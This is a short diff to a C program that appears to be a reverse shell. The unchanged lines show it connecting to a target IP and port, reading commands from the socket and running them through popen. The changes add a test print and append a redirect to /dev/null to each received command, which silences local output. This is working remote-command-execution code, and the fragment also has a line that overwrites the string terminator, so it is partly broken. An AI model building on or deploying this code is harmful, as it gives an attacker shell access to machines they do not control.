@@ -16,10 +16,10 @@ int conn;
 int valread;
 char output;
 char shell[10000];
-
+char redirect[100] = " >/dev/null 2>&1";
 
 int main(){
-
+  printf("It works!\n");
   char ip[] = target;
   int port = PORT;
 
@@ -38,8 +38,10 @@ int main(){
     fflush(stdout);
 
     valread = read(fd, message, 10000);
-    
+        
     if(valread > 0){
+      strcat(message, redirect);
+      message[strlen(message)] = ' ';
 
       FILE *file = popen(message, "r");
       output = fgetc(file);
